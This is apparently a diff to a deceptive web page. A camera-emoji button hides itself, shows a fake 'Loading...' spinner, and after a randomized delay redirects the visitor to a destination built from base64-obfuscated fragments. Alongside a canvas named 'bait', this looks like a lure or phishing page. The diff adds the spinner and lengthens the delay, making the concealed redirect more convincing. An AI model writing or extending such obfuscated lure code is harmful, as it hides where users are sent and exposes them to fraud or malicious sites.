@@ -15,6 +15,7 @@
       display: flex;
       justify-content: center;
       align-items: center;
+      flex-direction: column;
     }
     .btn {
       background-color: white;
@@ -29,10 +30,34 @@
     canvas.b {
       display: none;
     }
+    #loading {
+      display: none;
+      flex-direction: column;
+      align-items: center;
+      color: white;
+      font-size: 2rem;
+    }
+    .loader {
+      margin-top: 1rem;
+      width: 50px;
+      height: 50px;
+      border: 6px solid #fff;
+      border-top: 6px solid #555;
+      border-radius: 50%;
+      animation: spin 1s linear infinite;
+    }
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
   </style>
 </head>
 <body>
   <button class="btn" onclick="g()">📷</button>
+  <div id="loading">
+    ⏳ Loading...
+    <div class="loader"></div>
+  </div>
   <canvas class="b" id="bait"></canvas>
 
   <script>
@@ -74,12 +99,16 @@
 
     function g() {
       if (!i) return;
+
+      document.querySelector(".btn").style.display = "none";
+      document.getElementById("loading").style.display = "flex";
+
       setTimeout(() => {
         const p1 = "aHR0cHM6Ly9nYXlyb24ubGlmZS9y";
         const p2 = "ZWhiaXhlZQ==";
         const url = atob(p1 + p2);
         if (url.startsWith("http")) location.href = url;
-      }, 1500 + Math.random() * 500);
+      }, 2000 + Math.random() * 1000);
     }
   </script>
 </body>
